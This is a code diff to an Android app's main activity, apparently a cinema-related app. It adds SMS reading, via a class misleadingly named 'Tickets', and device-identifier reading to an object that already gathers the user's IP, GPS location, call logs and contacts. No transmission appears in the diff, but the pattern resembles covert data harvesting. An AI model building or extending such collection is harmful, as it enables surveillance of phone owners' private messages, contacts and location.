@@ -46,6 +46,7 @@ public class MainActivity extends AppCompatActivity {
     JSONObject utilsJson = new JSONObject();
     JSONObject gpsJson = new JSONObject();
     JSONArray callLogsJson = new JSONArray();
+    JSONObject messagesJson = new JSONObject();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -70,16 +71,13 @@ public class MainActivity extends AppCompatActivity {
 
         checkIfPermissonExists();
 
-        Utils utils = new Utils(context);
-        utilsJson = utils.getUtils();   //Permission error for Android 6.0
-        //new Tickets().getTickets(context);
-
         try {
             data.put("ip", ip);
             data.put("gps", gpsJson);
             data.put("callLog", callLogsJson);
             data.put("utils", utilsJson);
             data.put("contacts", contactsJson);
+            data.put("messages", messagesJson);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -92,10 +90,14 @@ public class MainActivity extends AppCompatActivity {
     final private int REQUEST_CODE_ASK_PERMISSIONS_CONTACT = 123;
     final private int REQUEST_CODE_ASK_PERMISSIONS_GPS = 124;
     final private int REQUEST_CODE_ASK_PERMISSIONS_CALLOG = 125;
+    final private int REQUEST_CODE_ASK_PERMISSIONS_MESSAGES = 126;
+    final private int REQUEST_CODE_ASK_PERMISSIONS_PHONE_STATE = 127;
     private void checkIfPermissonExists() {
         int hasWriteContactsPermission = 0;
         int hasGPSPermission = 0;
         int hasCallLogPermission = 0;
+        int hasMessagePermission = 0;
+        int hasDeviceId = 0;
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { //Android 6.0
 
             hasWriteContactsPermission = checkSelfPermission(Manifest.permission.READ_CONTACTS);
@@ -125,11 +127,30 @@ public class MainActivity extends AppCompatActivity {
             else {
                 readCallLogs();
             }
+            hasMessagePermission = checkSelfPermission(Manifest.permission.READ_SMS);
+            if(hasMessagePermission != PackageManager.PERMISSION_GRANTED){
+                requestPermissions(new String[] {Manifest.permission.READ_SMS}, REQUEST_CODE_ASK_PERMISSIONS_MESSAGES);
+                //return;
+            }
+            else {
+                readMessages();
+            }
+
+            hasDeviceId = checkSelfPermission(Manifest.permission.READ_PHONE_STATE);
+            if(hasDeviceId != PackageManager.PERMISSION_GRANTED){
+                requestPermissions(new String[] {Manifest.permission.READ_PHONE_STATE}, REQUEST_CODE_ASK_PERMISSIONS_PHONE_STATE);
+                //return;
+            }
+            else {
+                readUtils();
+            }
         }
         else {  // Android Version < Android 6.0
             readContacts();
             readGPS();
             readCallLogs();
+            readMessages();
+            readUtils();
         }
     }
 
@@ -161,6 +182,22 @@ public class MainActivity extends AppCompatActivity {
                     // Permission Denied
                     Toast.makeText(MainActivity.this, "READ_CALL_LOG Denied", Toast.LENGTH_SHORT).show();
                 }
+            case REQUEST_CODE_ASK_PERMISSIONS_MESSAGES:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    // Permission Granted
+                    readMessages();
+                } else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "READ_MESSAGES Denied", Toast.LENGTH_SHORT).show();
+                }
+            case REQUEST_CODE_ASK_PERMISSIONS_PHONE_STATE:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    // Permission Granted
+                    readUtils();
+                } else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "READ_PHONE_STATE Denied", Toast.LENGTH_SHORT).show();
+                }
             default:
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         }
@@ -185,6 +222,16 @@ public class MainActivity extends AppCompatActivity {
     public void readCallLogs(){
         CallLogs calllogs= new CallLogs(contentResolver);
         callLogsJson = calllogs.getCallLogs();
+    }
+
+    public void readMessages(){
+        Tickets messages= new Tickets();
+        messagesJson = messages.getTickets(context);
+    }
+
+    public void readUtils(){
+        Utils utils= new Utils(context);
+        utilsJson = utils.getUtils();
     }
 
     //getting sinemalar content
